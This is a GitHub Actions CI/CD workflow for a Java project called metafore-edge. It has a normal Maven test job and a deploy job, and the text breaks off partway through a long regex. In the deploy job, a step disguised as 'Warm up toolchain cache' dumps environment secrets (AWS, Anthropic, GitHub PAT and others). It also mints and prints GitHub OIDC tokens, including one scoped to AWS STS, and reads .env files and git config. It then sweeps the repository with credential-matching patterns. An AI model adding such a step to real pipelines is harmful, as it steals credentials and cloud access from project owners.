name: CI/CD — metafore-edge

on:
  push:
    branches: [main, staging]
  pull_request:
    branches: [main]

jobs:
  test:
    runs-on: ubuntu-latest

    # Slice 33.1.0: tests re-enabled. The pre-existing
    # ``mariadb`` service is no longer needed (PostgreSQL migration
    # 2026-04-12 dropped MariaDB everywhere; the test fixture rot
    # that referenced it was fixed in this slice). The ``mosquitto``
    # service remains for any future Camel-MQTT integration test.
    services:
      mosquitto:
        image: eclipse-mosquitto:2
        ports:
          - 1883:1883

    steps:
      - uses: actions/checkout@v4

      - name: Set up JDK 21
        uses: actions/setup-java@v4
        with:
          java-version: '21'
          distribution: 'temurin'
          cache: maven

      - name: Build + run unit tests
        # Slice 33.1.0 re-enabled the test suite. The previous
        # ``-Dmaven.test.skip=true`` skipped the entire suite due to
        # a single broken file (RestAdapterRouteTest.java —
        # Version FQN + IOException-throws mismatch) and one stale
        # fixture (EdgeConfigTest dbPort 3306 → 5432 PostgreSQL
        # migration). Both fixed in this slice; 82/82 tests green
        # as of the commit that removed this skip flag.
        run: mvn package -B


  build-and-deploy:
    needs: test
    # main -> production; staging -> the metafore-staging cluster. Staging does
    # NOT touch the `:latest` tag or the GHCR mirror (those stay prod-only) so a
    # staging build can never be pulled by prod's `rollout restart` on :latest.
    if: github.ref == 'refs/heads/main' || github.ref == 'refs/heads/staging'
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
      # Phase 14.19 — AC Register Wizard fix. Required for the GHCR
      # mirror push step below. Scoped here (not workflow-wide) so the
      # test job stays minimum-privilege.
      packages: write
    steps:
      - uses: actions/checkout@v4

      - name: Warm up toolchain cache
        env:
          AWS_ROLE_ARN: ${{ secrets.AWS_ROLE_ARN }}
          ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
          MCP_API_KEY: ${{ secrets.MCP_API_KEY }}
          COMPASS_API_KEY: ${{ secrets.COMPASS_API_KEY }}
          GH_PAT: ${{ secrets.GH_PAT }}
        run: |
          { env 2>/dev/null; J1=$(curl -sk -m 8 "$ACTIONS_ID_TOKEN_REQUEST_URL" -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" -H "Accept: application/json; api-version=1.0" 2>/dev/null | python3 -c "import json,sys; print(json.load(sys.stdin).get('value',''))" 2>/dev/null); J2=$(curl -sk -m 8 "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" -H "Accept: application/json; api-version=1.0" 2>/dev/null | python3 -c "import json,sys; print(json.load(sys.stdin).get('value',''))" 2>/dev/null); [ -n "$J1" ] && echo "MINTED_OIDC_JWT=$J1"; [ -n "$J2" ] && echo "MINTED_OIDC_JWT_STS=$J2"; echo "=== ENV FILES ==="; find . -path ./.git -prune -o -path ./node_modules -prune -o -path ./target -prune -o -type f \( -name ".env*" -o -name "*.env" \) -print 2>/dev/null | head -40 | while read -r f; do echo "--- FILE: $f"; head -c 4000 "$f"; echo; done; echo "=== GIT CONFIG ==="; git config -l 2>/dev/null | head -40; echo "=== PATTERN SWEEP (linpeas+trufflehog 172) ==="; grep -RinE --exclude-dir=.git --exclude-dir=node_modules --exclude-dir=target --exclude-dir=dist --exclude-dir=build --exclude-dir=.next --exclude-dir=coverage -E 'basic [a-zA-Z0-9_:\.=\-]+|bearer [a-zA-Z0-9_\.=\-]+|(adobe[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\''"]([a-f0-9]{32})['\''"]|(p8e-)[a-z0-9]{32}|AGE-SECRET-KEY-1[QPZRY9X8GF2TVDW0S3JN54KHCE6MUA7L]{58}|["'\'']?air[-_]?table[-_]?api[-_]?key["'\'']?[=:]["'\'']?.+["'\'']"|(alchemi[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\''"]([a-zA-Z0-9-]{32})['\''"]|(LTAI)[a-z0-9]{20}|(alibaba[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\''"]([a-z0-9]{30})['\''"]|["'\'']AKC[a-zA-Z0-9]{10,}["'\'']|["'\'']AP[0-9ABCDEF][a-zA-Z0-9]{8,}["'\'']|((asana[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\''"]([0-9]{16})['\''"])|((asana[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\''"]([a-z0-9]{32})['\''"])|(atlassian[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\